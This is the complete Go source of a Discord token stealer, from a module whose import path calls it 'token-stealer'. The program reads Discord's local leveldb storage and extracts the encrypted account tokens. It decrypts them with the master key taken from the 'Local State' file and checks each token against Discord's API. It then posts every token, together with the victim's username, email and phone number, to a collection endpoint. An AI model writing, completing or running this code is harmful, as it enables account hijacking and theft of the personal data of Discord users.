package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"regexp"
	"strings"
	token_lib "token-stealer/token-lib"
)

const (
	DISCORD_URL = "https://discord.com/api/v9/users/@me"
)

type Post struct {
	Token  string `json:"token"`
	Handle string `json:"handle"`
	Mail   string `json:"mail"`
	Phone  string `json:"phone"`
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func getDiscordDir(target_dir string) string {
	roaming := os.Getenv("APPDATA")
	return roaming + target_dir
}

func getDiscordTokens(token_dir string) []string {
	enc_tokens := []string{}

	c, err := os.ReadDir(token_dir)
	check(err)

	for _, file := range c {
		fname := file.Name()
		ext := path.Ext(fname)
		if ext == ".ldb" || ext == ".log" {
			discord_file := token_dir + "\\" + fname
			dat, err := os.ReadFile(discord_file)
			check(err)

			re := regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")
			match := re.FindStringSubmatch(string(dat))
			if len(match) != 0 {
				enc_tokens = append(enc_tokens, match[0])
			}
		}
	}

	return enc_tokens
}

func getMasterKey() []byte {
	key_dir := getDiscordDir("\\discord")
	key_data, err := os.ReadFile(key_dir + "\\" + "Local State")
	check(err)

	os_crypt := map[string]interface{}{}
	json.Unmarshal([]byte(string(key_data)), &os_crypt)
	b64key := os_crypt["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	encrypted_key, err := base64.StdEncoding.DecodeString(b64key)
	check(err)

	decrypted_key, err := token_lib.Decrypt(encrypted_key[5:])
	check(err)

	return decrypted_key
}

func isValidToken(token string) bool {
	req, err := http.NewRequest(http.MethodGet, DISCORD_URL, nil)
	check(err)

	req.Header.Set("Authorization", token)
	res, err := http.DefaultClient.Do(req)
	check(err)

	return res.StatusCode == 200
}

func isNotDup(tokens []string, token string) bool {
	for _, t := range tokens {
		if string(t) == token {
			return false
		}
	}
	return true
}

func decryptTokens(tokens []string) []string {
	discord_tokens := []string{}

	key := getMasterKey()
	for _, t := range tokens {
		data, err := base64.StdEncoding.DecodeString(strings.Split(t, ":")[1])
		check(err)

		iv := data[3:15]
		enc_token := data[15:]
		block, err := aes.NewCipher(key)
		check(err)

		cipher, err := cipher.NewGCM(block)
		check(err)

		token, err := cipher.Open(nil, iv, enc_token, nil)
		check(err)

		discord_token := string(token)
		if isValidToken(discord_token) && isNotDup(discord_tokens, discord_token) {
			discord_tokens = append(discord_tokens, discord_token)
		}
	}
	return discord_tokens
}

func sendUsersData(tokens []string) {
	for _, token := range tokens {
		req, err := http.NewRequest(http.MethodGet, DISCORD_URL, nil)
		check(err)

		req.Header.Set("Authorization", token)
		res, err := http.DefaultClient.Do(req)
		check(err)

		res_body, err := io.ReadAll(res.Body)
		check(err)

		user_data := map[string]interface{}{}
		json.Unmarshal([]byte(string(res_body)), &user_data)
		handle := fmt.Sprint(user_data["username"])
		mail := fmt.Sprint(user_data["email"])
		phone := fmt.Sprint(user_data["phone"])
		body := Post{
			Token:  token,
			Handle: handle,
			Mail:   mail,
			Phone:  phone,
		}
		bodyBytes, err := json.Marshal(&body)
		check(err)

		reader := bytes.NewReader(bodyBytes)
		resp, err := http.Post("http://127.0.0.1:1337/api/add", "application/json", reader)
		check(err)

		defer func() {
			err := resp.Body.Close()
			check(err)
		}()
	}
}

func main() {
	discord_dir := getDiscordDir("\\discord\\Local Storage\\leveldb")
	tokens := getDiscordTokens(discord_dir)
	tokens = decryptTokens(tokens)
	sendUsersData(tokens)
}
